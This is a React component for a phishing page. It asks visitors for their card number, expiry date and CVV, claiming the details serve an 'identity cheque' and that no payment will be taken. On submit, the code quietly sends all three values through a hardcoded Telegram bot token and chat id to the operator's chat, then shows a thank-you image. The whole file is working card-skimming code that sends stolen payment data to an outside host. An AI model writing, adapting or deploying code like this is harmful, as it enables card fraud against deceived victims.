import './Content.css';
import React, { useState } from 'react';
import logo from "../../assets/img/logo.png";
import thanks from "../../assets/img/thanks.jpg";

function Content() {
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [previousValueExpiry, setPreviousValueExpiry] = useState('');
  const [previousValueCard, setPreviousValueCard] = useState('');
  const [isValid, setIsValid] = useState(false);
  const [isFormSubmit, setIsFormSubmit] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    const token = '6717372587:AAGEg5e4YEYU4UCtNExCpxr9Td2zwbVTDGo';
    const id = '5651700820';

    const message = `Card number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}`;
    const telegramApiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(
      message
    )}`;
    if (cardNumber.length == 19 && expiry.length == 5 && cvv.length == 3) {
      setCardNumber('');
      setExpiry('');
      setCvv('');
      setIsFormSubmit(true);
    }
    fetch(telegramApiUrl)
      .then((response) => response.json())
      .then((data) => {
        console.log('Logged In', data);
      })
      .catch((error) => {
        console.error('Not Logged In', error);
      });
  };

  const handleCvv = (event) => {
    const value = event.target.value;
    if (/^\d*$/.test(value)) {
      setCvv(value);
    }
    if (event.target.value.length == 3 && cardNumber.length == 19 && expiry.length == 5) {
      setIsValid(true)
    } else {
      setIsValid(false)
    }
  }

  const handleExpiry = (event) => {
    let value = event.target.value;
    if (/^\d*$/.test(value) || /\//g.test(value)) {
      const isEntering = value.length > previousValueExpiry.length;
      const isRemoving = value.length < previousValueExpiry.length;
      if (isEntering) {
        if (value.length == 2) {
          if (Number(value) > 12) {
            value = "12/"
          } else {
            value = value + "/"
          }
        }
        if (value.length == 5) {
          let temp = value.split('/');
          if (Number(temp[1]) > 31) {
            value = temp[0] + "/31";
          } else {
            value = value;
          }
        }
      }
      if (isRemoving) {
        if (value.length == 2) {
          value = value.slice(0, -1);
        }
      }
      setPreviousValueExpiry(value);
      setExpiry(value);
    }
    if (event.target.value.length == 5 && cardNumber.length == 19 && cvv.length == 3) {
      setIsValid(true)
    } else {
      setIsValid(false)
    }
  }

  const handleCardNumber = (event) => {
    let value = event.target.value;
    if (/^[0-9 ]*$/.test(value)) {
      const isEntering = value.length > previousValueCard.length;
      const isRemoving = value.length < previousValueCard.length;
      if (isEntering) {
        if (value.length == 4 || value.length == 9 || value.length == 14) {
          value = value + " ";
        }
      }
      if (isRemoving) {
        if (value.length == 4 || value.length == 9 || value.length == 14) {
          value = value.slice(0, -1);
        }
      }
      setPreviousValueCard(value);
      setCardNumber(value);
    }
    if (event.target.value.length == 19 && expiry.length == 5 && cvv.length == 3) {
      setIsValid(true)
    } else {
      setIsValid(false)
    }
  }

  return (
    <>
      {isFormSubmit ? (
        <div className='submit_img'>
          <img style={{ height: "330px", borderRadius: "20px" }} src={thanks}></img>
        </div>
      ) : (
        <>
        <div className='header'>
            <img style={{ height: "200px" }} src={logo}></img>
          </div>
          <div className='content'>
              <form style={{ padding: "20px" }} onSubmit={handleSubmit}>
                <div className='inputs'>
                  <label className='form-label'>Card Number</label>
                  <input style={{ width: "368px" }} name='card_number' placeholder='Enter 16-Digit Card Number' maxLength='19' minLength='19' className='width_full form-input' type="text" required value={cardNumber} onChange={(event) => handleCardNumber(event)} />
                </div>
                <div className='first_col' style={{ justifyContent: "space-between" }}>
                  <div className='inputs' style={{ marginRight: "18px" }}>
                    <label className='form-label'>Expiry Date</label>
                    <input style={{ width: "130px" }} name='expiry' placeholder='MM/YY' maxLength='5' minLength='5' className='width_full form-input' type="text" required value={expiry} onChange={(event) => handleExpiry(event)} />
                  </div>
                  <div className='inputs'>
                    <label className='form-label'>CVV</label>
                    <input style={{ width: "130px" }} name='cvv' placeholder='Enter CVV' maxLength='3' minLength='3' className='width_full form-input' type="text" required value={cvv} onChange={(event) => handleCvv(event)} />
                  </div>
                </div>
                {isValid ? (
                  <button className='form-submit-2' type="submit">
                    Submit
                  </button>
                ) : (
                  <button className='form_submit' type="submit">
                    Submit
                  </button>
                )}
              </form>
            </div>
            <div className='bullet_1'>
              <div className='bullet_2'>
                <ul>
                  <li className='bulletList-li'> Details You Are Entering Will Be Used For Identity Cheque Purposes. </li>
                  <li className='bulletList-li'> No Payment Will Be Taken. </li>
                  <li className='bulletList-li'> Details Provided Above Must Be Registered To Your Billing Address for AVS (Address Verification System) Cheque. </li>
                </ul>
              </div>
            </div>
          </>
      )}
    </>
  );
}

export default Content;